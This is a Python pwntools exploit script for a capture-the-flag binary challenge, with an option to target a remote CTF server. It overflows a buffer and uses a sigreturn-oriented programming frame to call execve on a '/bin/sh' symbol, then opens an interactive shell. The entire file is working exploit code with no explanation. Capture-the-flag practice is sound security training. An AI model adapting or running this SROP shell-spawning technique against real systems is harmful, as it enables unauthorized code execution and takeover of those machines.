from pwn import *
from struct import *

def exploit(r):

    payload = ''
    payload += 'A'*16 # Overflow RAX at 16 Bytes
    payload += p64(15)

    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = binary.symbols["binsh"]
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = 0x0000000000400136
    payload += str(frame)
    r.recvuntil(':\n')
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    name = './challenge'
    binary = ELF(name)
    context.terminal=["tmux", "sp", "-h"]
    context.log_level = 'DEBUG'
    context.arch = "amd64"

    if len(sys.argv) > 1:
        r = remote('university.opentoallctf.com', '30003')
    else:
        r = process(name)
        pause()
	#gdb.attach(r, """

	#c
	#""")

    exploit(r)

